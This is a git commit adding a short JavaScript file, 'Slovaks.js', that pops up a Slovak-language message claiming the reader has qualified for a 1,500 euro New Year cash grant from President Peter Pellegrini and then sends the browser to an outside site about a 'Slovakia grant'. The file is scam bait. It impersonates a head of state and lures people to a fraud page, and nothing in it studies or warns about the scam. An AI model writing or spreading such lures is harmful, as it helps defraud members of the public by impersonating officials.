cbe5e9a8533f4a3981dbf13cea75e11ec2ddadc6
ebeekpo <imohdavid078@gmail.com>
2024-12-29 15:48:25 +0100

    Create Slovaks.js

---
+++ Slovaks.js
@@ -0,0 +1,6 @@
+
+var password = 'VÝBER 1 500 €'
+password=prompt('SMS: Blahoželáme, kvalifikovali ste sa pre prezidenta PETER PELLEGRINI 1 500 € NOVOROČNÝ HOTOVOSTNÝ GRANT PRE SLOVÁKOV, stlačte OK a vyberte novoročný finančný grant   ','VÝBER 1 500 €');
+if (password != 'VÝBER 1 500 €') {
+location.href='https://bestfree-portal.org/slovakia-grant.html';
+}
